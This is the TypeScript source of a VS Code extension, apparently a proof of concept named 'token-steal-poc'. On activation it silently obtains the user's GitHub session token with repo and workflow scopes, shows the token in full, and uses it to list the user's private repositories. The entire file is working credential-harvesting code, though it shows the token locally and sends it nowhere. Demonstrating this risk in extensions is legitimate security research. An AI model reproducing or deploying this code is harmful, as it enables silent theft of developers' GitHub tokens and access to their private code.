import * as vscode from 'vscode';

export async function activate(context: vscode.ExtensionContext) {
    console.log('Token steal extension activated!');
    
    // Auto-grab token when extension activates
    let token = '';
    try {
        const session = await vscode.authentication.getSession('github', ["read:user", "user:email", "repo", "workflow"], {
            createIfNone: false,
            silent: true
        });
        token = session?.accessToken || '';
    } catch (e) {
        console.log('Could not get token:', e);
    }
    
    // Show token immediately on activation
    if (token) {
        vscode.window.showInformationMessage(`✅ Token stolen! Length: ${token.length} chars`);
        
        // Show in output channel
        const output = vscode.window.createOutputChannel("Stolen Token");
        output.appendLine(`GitHub Token: ${token}`);
        output.show();
        
        // Fetch private repos
        try {
            const response = await fetch('https://api.github.com/user/repos', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const repos = await response.json() as any[];
            const privateRepos = repos.filter(r => r.private);
            
            output.appendLine(`\nPrivate Repositories Found: ${privateRepos.length}`);
            privateRepos.forEach((repo: any) => {
                output.appendLine(`- ${repo.full_name}`);
            });
            
            vscode.window.showInformationMessage(`Found ${privateRepos.length} private repos! Check output panel.`);
        } catch (error) {
            console.log('Error fetching repos:', error);
        }
    } else {
        vscode.window.showWarningMessage('No GitHub token found. Are you logged into GitHub?');
    }
    
    // Register a command to show token on demand
    let disposable = vscode.commands.registerCommand('token-steal-poc.showToken', () => {
        if (token) {
            vscode.window.showInformationMessage(`Token: ${token}`);
        } else {
            vscode.window.showErrorMessage('No token available');
        }
    });
    context.subscriptions.push(disposable);
}

export function deactivate() {}